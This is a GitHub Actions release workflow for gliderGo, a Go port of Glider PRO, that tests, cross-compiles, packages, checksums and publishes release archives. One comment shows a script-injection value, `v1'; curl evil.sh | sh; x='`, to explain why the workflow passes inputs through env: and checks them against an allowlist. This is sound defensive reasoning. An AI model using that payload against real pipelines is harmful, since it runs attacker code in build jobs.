# gliderGo release builds.
#
# HONEST CAVEAT, READ FIRST. Like ci.yml, this was written on an airgapped host that cannot
# reach github.com, so it has never run. Every command it invokes is verified locally --
# `make check`, `make assets-check` and `make cross` all pass here, and the packaging steps
# below were rehearsed by hand against the same bin/cross/ layout `make cross` writes. What is
# unverified is the GitHub half: action versions, runner package names, and `gh release`'s
# behaviour. Expect the first tag to need a correction. Push a throwaway tag first --
# `git tag v0.0.1-rc1 && git push origin v0.0.1-rc1`, which publishes as a prerelease and can be
# deleted -- or use the workflow_dispatch entry below, which builds and uploads the archives as a
# run artifact and cannot create a Release from any ref, including a tag.
#
# WHAT A RELEASE ARCHIVE CONTAINS, AND WHY IT IS SHAPED THIS WAY.
# Two binaries and the documents a stranger needs, and nothing else. The assets are inside the
# executables: assets/extracted.zip is compiled in by //go:embed (assets/assets.go), so the art,
# the sounds and all 22 houses travel in the binary itself and the working directory means
# nothing.
#
#     tar xzf glidergo-v1.0.0-linux-amd64.tar.gz
#     ./glidergo-v1.0.0-linux-amd64/glidergo
#
# from anywhere at all. The -art, -houses, -houseart and -sound flags still take a directory, for
# a player who wants to run edited art; empty, which is the default, means the copy built in.
# Archives used to carry a copy of assets/extracted/ and had to be run from their own root; that
# was docs/IMPROVEMENTS.md 5.3, now closed. The cost is that both binaries carry the same 11 MiB,
# so an archive is bigger than it was even though it holds fewer files.
#
# WHICH BUILDS CAN ACTUALLY DRAW. Three of the six: linux/amd64 through X11, and both windows
# targets through GDI. The linux one is built with cgo against libX11; the windows ones need no
# cgo at all, because internal/platform/win32 is pure syscall. The remaining three -- both darwin
# targets and cross-compiled linux/arm64 -- resolve to the null backend (see `make cross`'s comment
# for the build-tag complements), which runs the whole game but shows nothing on screen, and those
# archives are named `-headless` so nobody downloads one expecting to play. macOS is stage 6.
#
# The windows archives used to carry a caveat the linux one did not -- that neither the backend nor
# the sound behind it had ever been executed. For windows-amd64 that is no longer true: it has been
# run on Windows Server 2025 on a real interactive desktop, and the window's pixels matched a
# Linux-rendered frame exactly (docs/windows-first-run.md). windows-arm64 keeps the caveat, because
# the machine that ran the tests was x86-64 and nothing here has an ARM64 Windows to try. What is
# also no longer a gap is sound: internal/audio has a native waveOut driver, so an unzipped .exe
# plays without FFmpeg or anything else installed, and `-audio ffplay` is the way round it if the
# driver misbehaves (docs/IMPROVEMENTS.md 2.48). The release notes below say all of this in the
# reader's terms rather than the maintainer's.

name: Release

on:
  push:
    tags: ["v*"]
  workflow_dispatch:
    inputs:
      version:
        description: "Version string to stamp into the binaries (e.g. v0.0.0-test). Not tagged, not released."
        required: true
        default: v0.0.0-test

# Read by default; the publish job below opts into `contents: write` for itself alone, so a
# compromised build step cannot create a release or move a tag.
permissions:
  contents: read

# One release per tag, and never two at once: a re-pushed tag would otherwise race two runs
# uploading the same asset names.
concurrency:
  group: release-${{ github.ref }}
  cancel-in-progress: false

env:
  # The repo's defaults, restated so a release log shows them. gliderGo is standard library
  # only -- internal/module asserts it -- so `off` should never bite; if it does, that is the
  # news, and it is better heard here than in a shipped binary.
  GOPROXY: "off"
  GOTOOLCHAIN: local

jobs:
  # ---------------------------------------------------------------------------
  # Nothing ships untested.
  #
  # This job is not redundant with ci.yml: that workflow triggers on `push: branches` and on
  # pull_request, and a tag push is neither, so tagging runs no tests at all unless this job
  # does. Shipping a binary that no suite ever saw is the failure this exists to prevent.
  # ---------------------------------------------------------------------------
  verify:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@v5

      # libx11-dev is a hard requirement, not a nicety: with cgo on, `vet` and `test` compile
      # internal/platform/backend, which resolves to the x11 file, and without pkg-config
      # metadata the build fails with pkg-config's error rather than the Makefile's. xvfb is
      # for the on-screen bench.
      - name: Install C dependencies
        run: |
          sudo apt-get update
          sudo apt-get install -y --no-install-recommends \
            build-essential pkg-config libx11-dev xvfb

      - uses: actions/setup-go@v6
        with:
          go-version-file: go.mod
          cache: false

      - name: Report the environment
        run: make doctor

      # There are two committed copies of the assets and this job needs both. extracted.zip is
      # what goes into the binaries, so a build without it is an empty window -- the Makefile's
      # `embedded` guard refuses that, and so does this, earlier and with the archive named.
      # extracted/ is the working tree, which is what `make assets-check` re-extracts against and
      # what the pixel corpus and the house round-trip read by path; lose it and those targets
      # skip, `make check` goes green, and nothing has compared a pixel. `go test ./assets`,
      # inside `make check`, is what proves the two copies still hold the same bytes.
      - name: Refuse a checkout that is missing its assets
        run: |
          test -s assets/extracted.zip
          test -s assets/extracted/art/manifest.json
          test -s assets/extracted/sound/manifest.tsv
          ls assets/extracted/houses/*.house >/dev/null

      - name: make check
        run: make check OUT="$RUNNER_TEMP"

      # Proves the committed assets are still exactly what the extractor produces from
      # GliderPRO/ -- so a release ships art nobody hand-edited.
      - name: Verify the committed assets against their 1994 source
        run: make assets-check OUT="$RUNNER_TEMP"

      - name: On-screen bench under Xvfb
        run: xvfb-run -a -s '-screen 0 640x480x24' make bench

  # ---------------------------------------------------------------------------
  # Build every target, package each one, checksum the lot.
  #
  # One job rather than a matrix: `make cross` already builds all seven binaries on one Linux
  # runner in seconds, and a matrix would mean seven upload/download round trips to reassemble
  # a single SHA256SUMS file. The trade-off is that the darwin and windows archives are
  # cross-compiled and never executed here -- ci.yml's `native` job is what runs their tests.
  # ---------------------------------------------------------------------------
  build:
    needs: verify
    runs-on: ubuntu-latest
    timeout-minutes: 30
    # The version this job resolved, so `publish` names the release after the string that is
    # actually stamped into the binaries and the archive filenames instead of deriving a second
    # one of its own. On a tag push the two are identical; anywhere else they are not, and the
    # release would then advertise a filename it did not attach.
    outputs:
      version: ${{ steps.v.outputs.version }}
    steps:
      # fetch-depth: 0 because the Makefile's VERSION comes from `git describe --tags`. A
      # shallow checkout has the tag but no history behind it, and describe then answers with
      # something other than the tag. VERSION is passed explicitly below anyway; the full
      # history keeps `make doctor` and any incidental describe honest.
      - uses: actions/checkout@v5
        with:
          fetch-depth: 0

      - name: Install C dependencies
        run: |
          sudo apt-get update
          sudo apt-get install -y --no-install-recommends \
            build-essential pkg-config libx11-dev

      - uses: actions/setup-go@v6
        with:
          go-version-file: go.mod
          cache: false

      # The tag for a tag push, the dispatch input for a manual run. Stamped into every binary
      # via the Makefile's -X main.version, so `glidergo -version` and the title screen agree
      # with the release it came from. Passed explicitly rather than left to `git describe` so
      # that a manual run is stamped with something meaningful too.
      #
      # The dispatch input arrives through `env:` rather than `${{ }}` inside the script, and
      # that is not a style choice: `${{ }}` is textual substitution performed before bash sees
      # a single character of this, so `version='${{ inputs.version }}'` with an input of
      # `v1'; curl evil.sh | sh; x='` renders as valid shell and runs it -- in the job that
      # holds the checkout and builds what the release ships. Through `env:` the value is data.
      #
      # The allowlist then narrows it to what the rest of the pipeline can actually survive:
      # `$version` becomes a `-ldflags` argument, six directory names and six archive names, so
      # a space, a slash or a quote in it breaks the build or produces files nobody can name.
      # Anchored, because an unanchored `v[0-9]*` admits every one of those.
      - name: Resolve the version
        id: v
        env:
          INPUT_VERSION: ${{ inputs.version }}
        run: |
          set -euo pipefail
          if [ "$GITHUB_EVENT_NAME" = "workflow_dispatch" ]; then
            version="$INPUT_VERSION"
          else
            version="$GITHUB_REF_NAME"
          fi
          if [ -z "$version" ]; then
            echo "::error::could not resolve a version"
            exit 1
          fi
          if [[ ! "$version" =~ ^v[0-9][A-Za-z0-9.+_-]*$ ]]; then
            echo "::error::version must look like v1.2.3, got '$version'"
            exit 1
          fi
          echo "version=$version" >> "$GITHUB_OUTPUT"
          echo "Building $version"

      # This job needs only the archive: it packages binaries, and the binaries are the assets.
      # `make cross` refuses without it too (the Makefile's `embedded` target), but a named
      # failure here is a clearer thing to read in a release log than a build that stopped.
      - name: Refuse a checkout that is missing the archive the binaries embed
        run: test -s assets/extracted.zip

      # Writes bin/cross/glidergo-$os-$arch[.exe] and glidertool-$os-$arch[.exe] for the six
      # CGO_ENABLED=0 targets, plus bin/cross/glidergo-linux-amd64-x11 for the host's own cgo
      # build. `make cross` exits non-zero if any of them fails, including the x11 one, so this
      # step is the gate on "every target a release ships still compiles".
      - name: Cross-compile every release target
        env:
          VERSION: ${{ steps.v.outputs.version }}
        run: make cross VERSION="$VERSION"

      # The claim every archive below rests on, tested rather than asserted: one binary, alone in
      # an empty directory, with no asset tree anywhere near it and a working directory that means
      # nothing. `-version` reports what it found and `-shot` makes it actually decode the art and
      # composite a screen, which is the difference between "the archive opened" and "the game is
      # in there". The CGO_ENABLED=0 build is the one used because it needs no libX11 and `-shot`
      # needs no display; both are true of the x11 build as well, but this way the step tests the
      # binary that has the least beside it.
      - name: Prove a binary needs no files beside it
        run: |
          set -euo pipefail
          empty="$(mktemp -d)"
          cp bin/cross/glidergo-linux-amd64 "$empty/glidergo"
          cd "$empty"
          ./glidergo -version
          ./glidergo -shot title.png
          test -s title.png

      # Package one directory per target: the two binaries at the root and the documents a
      # stranger needs. No asset tree -- see the header.
      #
      # linux/amd64 gets the cgo x11 binary rather than the CGO_ENABLED=0 one, so the archive a
      # Linux player downloads is the playable one. The two windows archives are playable from
      # the plain cross-build, because win32 needs no cgo. The other three get the null-backend
      # build and are named `-headless`, because an archive that silently shows nothing is worse
      # than one that says so in its filename.
      - name: Package the archives
        id: pkg
        env:
          VERSION: ${{ steps.v.outputs.version }}
        run: |
          set -euo pipefail
          mkdir -p dist

          # target|binary-suffix|archive-suffix|format
          #   binary-suffix picks which bin/cross/ build goes in, since linux-amd64 has two.
          targets='
          linux-amd64|-x11||tar
          linux-arm64||-headless|tar
          darwin-amd64||-headless|tar
          darwin-arm64||-headless|tar
          windows-amd64|||zip
          windows-arm64|||zip
          '

          for row in $targets; do
            IFS='|' read -r target binsuf arcsuf format <<EOF
          $row
          EOF
            name="glidergo-${VERSION}-${target}${arcsuf}"
            stage="dist/$name"
            mkdir -p "$stage"

            exe=""
            case "$target" in windows-*) exe=".exe" ;; esac

            cp "bin/cross/glidergo-${target}${binsuf}${exe}"  "$stage/glidergo${exe}"
            cp "bin/cross/glidertool-${target}${exe}"         "$stage/glidertool${exe}"

            # The README's nine links into docs/ would every one of them 404 inside an archive
            # that carries no docs/ -- three of them the screenshots at the very top, which is
            # the first thing anyone opening it sees. Shipping 9.2 MB of development notes six
            # times over to fix that is the wrong trade; rewriting the links is the right one.
            #
            # Pinned at the commit built from rather than at a branch, so they resolve to the
            # source these exact binaries were compiled from however far the default branch
            # moves afterwards. Screenshots first: theirs is the narrower pattern, and they need
            # /raw/ to render rather than /blob/.
            base="${GITHUB_SERVER_URL}/${GITHUB_REPOSITORY}"
            sed -E \
              -e "s#\]\((docs/screenshots/[^)]*)\)#](${base}/raw/${GITHUB_SHA}/\1)#g" \
              -e "s#\]\((docs/[^)]*)\)#](${base}/blob/${GITHUB_SHA}/\1)#g" \
              README.md > "$stage/README.md"
            cp LICENSE CHANGELOG.md "$stage/"
            mkdir -p "$stage/GliderPRO"
            cp "GliderPRO/README.md"        "$stage/GliderPRO/README.md"
            cp "GliderPRO/GPLv2-LICENSE.md" "$stage/GliderPRO/GPLv2-LICENSE.md"

            # How to actually start it, next to the thing you just unpacked. Written for the
            # only reader who matters here: somebody who has this archive open and does not
            # know that three of the six cannot draw, or that one of the three that can
            # (windows-arm64) has never been run on a machine of its own architecture.
            #
            # A headless archive must NOT tell its reader to run the bare binary. The null
            # backend delivers no quit event, and without -frames the shell loop has no exit
            # condition, so `./glidergo` prints one line and then spins on an invisible title
            # screen until Ctrl-C. Both commands below were run against an unpacked archive
            # and both exit 0 with something to show for it.
            #
            # The heredoc bodies sit flush with the block scalar's own indentation -- that is
            # what puts them at column 0 in the script the runner executes, the same reason the
            # `read` heredoc above is written that way. Unquoted terminator, so ${cmd} expands.
            #
            # ${cmd} carries the `./`, and it is not decoration: an unpacked archive is not on
            # anybody's PATH, so a bare `glidergo` is "command not found" in every Unix shell,
            # and a bare `glidergo.exe` is the same in PowerShell -- which is the shell a Windows
            # reader is most likely to have open. `.\` works in PowerShell and in cmd.exe both.
            # Assigned in single quotes so the backslash needs no escaping.
            case "$format" in
              zip) cmd='.\glidergo.exe' ;;
              *)   cmd='./glidergo' ;;
            esac

            if [ -n "$arcsuf" ]; then
              cat > "$stage/HOW-TO-RUN.txt" <<TXT
          This build has no window backend yet. It runs the whole game -- physics, rooms,
          scoring, sound -- but it cannot draw to a screen, so starting it with no arguments
          leaves you looking at nothing, with no way out but Ctrl-C. That is expected, and it
          is why this archive is named "headless".

          Two things it will do. Open a terminal in this directory and run:

              ${cmd} -shot title.png
                  Writes the title screen to title.png, and exits.

              ${cmd} -house Slumberland -frames 300 -dump frames
                  Plays 300 frames of a house, writes each one into frames/ as a PNG,
                  and reports the score it reached.

          Neither one needs any file beside it. The art, the sounds and all 22 houses are inside
          the binary, so glidergo can be moved anywhere and run from any directory.

          The linux-amd64 and windows archives do draw. On Linux arm64, building from source on
          the machine itself gives you the X11 backend -- this archive is headless only because
          it was cross-compiled without cgo. macOS is stage 6. See README.md.
          TXT
            elif [ "$format" = zip ]; then
              cat > "$stage/HOW-TO-RUN.txt" <<TXT
          Open PowerShell or Command Prompt in this directory and run:

              ${cmd}

          Double-clicking glidergo.exe in Explorer works too, and so does copying it wherever you
          keep programs: everything the game needs -- the art, the sounds, all 22 houses -- is
          inside the .exe, which is why it is 15 MB. A console window opens alongside the game;
          that is where it says which house it loaded and what it could not find.

          ONE THING TO EXPECT ON WINDOWS.

          This is the first Windows release, and the code behind it has had far less wear than
          the Linux equivalent: the window, the keyboard and the sound were all written on
          Linux, which cannot run any of them, so you may well be the first person to see it
          draw or hear it play. If something looks wrong it probably is, and a bug report with
          the console output in it is worth a great deal. See README.md.

          Sound needs nothing installed -- the game talks to Windows' own audio directly. If it
          is silent or stutters, "${cmd} -audio list" shows what this machine has, "${cmd}
          -audio ffplay" uses FFmpeg instead if you have it, and "${cmd} -wav out.wav" writes
          what you should have heard to a file.
          TXT
            else
              cat > "$stage/HOW-TO-RUN.txt" <<TXT
          Open a terminal in this directory and run:

              ${cmd}

          It needs no files beside it. The art, the sounds and all 22 houses are inside the
          binary, which is why it is 15 MB, so you can copy glidergo to ~/bin or /usr/local/bin
          and run it from anywhere. Linux needs libX11 at run time -- libx11-6, which every
          desktop install already has -- and a 24- or 32-bit display.
          TXT
            fi

            # CRLF for an archive Windows will unpack, so Notepad shows lines and not one line.
            if [ "$format" = zip ]; then
              sed -i 's/$/\r/' "$stage/HOW-TO-RUN.txt"
            fi

            # Every archive is verified to hold a binary with its assets in it before it is
            # sealed. A stale bin/cross/ or a `cp` that silently did nothing would otherwise ship.
            #
            # Grepping an executable is the check that works for all six targets: zip stores its
            # member names uncompressed, so the built-in tree's own filenames are literal bytes in
            # every one of these binaries, including the windows and darwin builds this runner
            # cannot execute. The step above already ran the linux one for real.
            test -x "$stage/glidergo${exe}"
            grep -qa "houses/Demo House.house" "$stage/glidergo${exe}"
            grep -qa "sound/manifest.tsv"      "$stage/glidergo${exe}"

            # And that the link rewrite above actually fired. A README whose sed silently missed
            # ships broken images to every downloader, which is exactly the kind of failure
            # nobody reports.
            ! grep -q '](docs/' "$stage/README.md"

            case "$format" in
              tar) tar -C dist -czf "dist/${name}.tar.gz" "$name" ;;
              zip) (cd dist && zip -qr "${name}.zip" "$name") ;;
            esac
            rm -rf "$stage"
            echo "  packaged $name"
          done

          # One checksum file for the whole release, with bare filenames so that
          # `sha256sum -c SHA256SUMS` works in the directory a browser downloaded them into.
          (cd dist && sha256sum ./*.tar.gz ./*.zip | sed 's| \./| |' > SHA256SUMS)
          echo "--- dist ---"
          ls -l dist
          cat dist/SHA256SUMS

      # Verifies the checksum file against the archives it just described, and proves each
      # archive actually unpacks. A corrupt upload is not worth discovering from a bug report.
      - name: Verify the archives and their checksums
        run: |
          set -euo pipefail
          (cd dist && sha256sum -c SHA256SUMS)
          for f in dist/*.tar.gz; do tar -tzf "$f" >/dev/null; echo "  ok $f"; done
          for f in dist/*.zip;    do unzip -qt "$f";            echo "  ok $f"; done

      - uses: actions/upload-artifact@v5
        with:
          name: release-archives
          path: dist/
          retention-days: 14
          if-no-files-found: error

  # ---------------------------------------------------------------------------
  # Publish. Separate from `build` so that `contents: write` is scoped to the one job that
  # needs it, and so a manual workflow_dispatch run can build archives without ever being able
  # to create a release.
  #
  # Both halves of the `if` are load-bearing. A tag check alone is not enough: the "Run
  # workflow" ref picker and the REST dispatch endpoint both accept a tag, so dispatching
  # against `v1.2.3` makes github.ref `refs/tags/v1.2.3` and a tag-only gate opens. That run
  # would publish a release named after the tag while every asset in it was named and stamped
  # with the dispatch input instead -- a release whose own instructions name a file it does not
  # contain. Requiring the push event is what makes the dispatch path unable to publish at all.
  # ---------------------------------------------------------------------------
  publish:
    needs: build
    if: github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v')
    runs-on: ubuntu-latest
    timeout-minutes: 15
    permissions:
      contents: write
    steps:
      - uses: actions/checkout@v5

      - uses: actions/download-artifact@v5
        with:
          name: release-archives
          path: dist

      - name: Write the release notes
        env:
          VERSION: ${{ needs.build.outputs.version }}
        run: |
          set -euo pipefail
          cat > notes.md <<'HEADER'
          A Go port of Glider PRO, John Calhoun's 1994 Macintosh game. One file, nothing to
          install: the original art, the sounds and all 22 houses are inside the binary, which
          is why it is 15 MB.

          ### Which one do I want?

          | Archive | Plays on screen? |
          |---|---|
          | `linux-amd64` | **Yes** — X11 backend, built against libX11. |
          | `windows-amd64` | **Yes** — GDI backend, and it has been watched doing it. |
          | `windows-arm64` | **Yes** — the same GDI backend, but never run on an ARM64 machine. |
          | anything marked `headless` | No. It runs the whole game but draws nothing yet. |

          macOS is stage 6. The headless builds are still useful: they run houses, take `-shot`
          screenshots and dump frames as PNGs.

          ### If you are on Windows, read this first

          Two things, both honest rather than apologetic.

          **The x86-64 Windows build has been run, on Windows Server 2025 (build 26100).** For
          the first releases it had not been, and this section said so: the window, the keyboard
          and the sound were all written on an offline Linux machine with no Windows to test on.
          It has since been run on a real interactive desktop — 4,320 frames of *Slumberland*
          across six runs, the paced one holding 29.9 fps against the original's 30.07 target.
          The `waveOut` driver found a device and played every sound it asked for, 0 refused.
          The strongest result is that the six title screens the game renders came out
          **byte-identical** to the same version's output on Linux, and so did the window
          itself: a screenshot of the running game matches a Linux-rendered frame exactly,
          pixel for pixel.

          What that run did **not** cover, in order of how soon you will hit it: playing with a
          keyboard, touching the window, and the ARM64 build. It was driven by `-frames`, so
          nobody has yet steered a glider through a house on Windows by hand —
          `internal/platform/win32/keys.go` is still the least-exercised file here — and nothing
          resized, minimised or closed the window either. If any of that misbehaves, a bug report
          with the console output in it is genuinely useful. `docs/windows-first-run.md` in the
          source tree is the full write-up, including the hashes and how to reproduce them.

          **Sound needs nothing installed.** The game carries its own `waveOut` driver and
          talks to Windows' audio directly — no FFmpeg, no redistributable. `-audio list` shows
          what this machine has, `-audio ffplay` uses FFmpeg instead if the driver gives you
          trouble and you have it, and `-wav out.wav` writes what you should have heard to a
          file.

          ### Running it

          Unpack it and run it, from wherever you like:

          ```
          tar xzf glidergo-VERSION-linux-amd64.tar.gz
          ./glidergo-VERSION-linux-amd64/glidergo
          ```

          Copy `glidergo` to `~/bin` and it still works — there is no asset directory to keep
          beside it, no install step and no config to write. On Windows, unzip and either
          double-click `glidergo.exe` or run `.\glidergo.exe`. Each archive has a
          `HOW-TO-RUN.txt` saying the same thing.

          `glidergo -version` lists what the binary is carrying. If you would rather play
          edited art or your own houses, `-art`, `-houses`, `-houseart` and `-sound` each take
          a directory and replace the built-in copy.

          High scores and saved games go to `~/.local/share/glidergo` on Linux and
          `%AppData%\glidergo` on Windows rather than next to the binary, so they survive you
          replacing it with the next release.

          Linux needs libX11 at run time (`libx11-6`, present on any desktop install) and a
          24- or 32-bit display. Windows needs nothing at all — no runtime, no redistributable.

          ### Verifying the download

          `SHA256SUMS` covers all six archives, so tell it to ignore the five you did not
          download — otherwise it reports those as `FAILED open or read` and exits non-zero,
          which reads exactly like a corrupt download and isn't one:

          ```
          sha256sum --ignore-missing -c SHA256SUMS
          ```

          macOS has no `sha256sum`. Hash your one file with `shasum -a 256 <archive>` and
          compare the line by eye against `SHA256SUMS`.

          ### Licence

          GPLv2, inherited from Calhoun's own source release. The art, sounds and houses are
          his and his house authors'; see `GliderPRO/README.md` in any archive for the credits.
          HEADER
          sed -i "s/VERSION/${VERSION}/g" notes.md
          echo '--- notes.md ---'; cat notes.md

      # `gh` is preinstalled on GitHub-hosted runners, so this needs no third-party action --
      # which matters for a project whose whole premise is that it has no dependencies. It also
      # means there is no marketplace action in the supply chain of a signed release.
      #
      # --verify-tag refuses to invent a tag that does not exist. Without it a typo in a
      # protected-branch setup can create one.
      #
      # Attach-if-it-exists rather than create-or-die, because `gh release create` fails on an
      # existing tag and two ordinary routes arrive here with one already made. Publishing
      # through the Releases UI creates the tag, which fires this workflow, which then spends
      # half an hour building archives only to refuse to attach them; and the header above tells
      # you to rehearse with a throwaway tag, so deleting and re-pushing it hits the same wall.
      # Either way the archives would survive only as a 14-day run artifact for somebody to
      # upload by hand. Notes written in the UI are left alone -- a human who typed them meant
      # them, and this job has nothing better to say.
      - name: Create or update the release
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          VERSION: ${{ needs.build.outputs.version }}
        run: |
          set -euo pipefail
          if gh release view "$VERSION" >/dev/null 2>&1; then
            echo "release $VERSION already exists -- attaching the archives, leaving its notes as they are"
            gh release upload "$VERSION" dist/* --clobber
          else
            prerelease=""
            case "$VERSION" in *-rc*|*-alpha*|*-beta*|*-test*) prerelease="--prerelease" ;; esac
            gh release create "$VERSION" \
              --title "gliderGo $VERSION" \
              --notes-file notes.md \
              --verify-tag \
              $prerelease \
              dist/*
          fi
          gh release view "$VERSION" --json tagName,isPrerelease,assets \
            --jq '"published \(.tagName) prerelease=\(.isPrerelease) assets=\(.assets|length)"'
